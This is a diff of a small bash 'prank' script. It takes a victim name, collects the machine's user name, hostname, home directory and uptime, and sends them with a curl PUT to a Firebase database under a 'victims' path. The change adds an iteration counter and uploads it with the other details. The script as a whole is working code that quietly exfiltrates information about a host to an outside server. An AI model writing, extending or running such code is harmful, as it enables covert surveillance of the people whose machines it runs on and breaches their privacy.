@@ -1,8 +1,20 @@
 # REST API
 # https://firebase.google.com/docs/reference/rest/database/
 
+SCRIPTDIR=$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )
+
 victim="$1"
 firebaseProject="prankproject-cb680"
+
+iterationFile="$SCRIPTDIR/firebaseTest.iteration"
+if [ ! -e "$iterationFile" ]; then
+  echo "0" > "$iterationFile"
+fi
+
+iteration=`cat "$iterationFile"`
+echo $((iteration + 1)) > "$iterationFile"
+
+###############################################################################
 
 function getVictimDetails(){
 
@@ -25,6 +37,7 @@ function setVictimDetails(){
   local uptime="`uptime`"
 
   curl -X PUT -d "{
+    \"iteration\" : \"$iteration\",
     \"userName\" : \"$userName\",
     \"hostname\" : \"$hostName\",
     \"homedir\" : \"$homedir\",
@@ -35,6 +48,8 @@ function setVictimDetails(){
   }" \
   "https://${firebaseProject}.firebaseio.com/victims/$victim/details.json"
 }
+
+###############################################################################
 
 getVictimDetails
 setVictimDetails
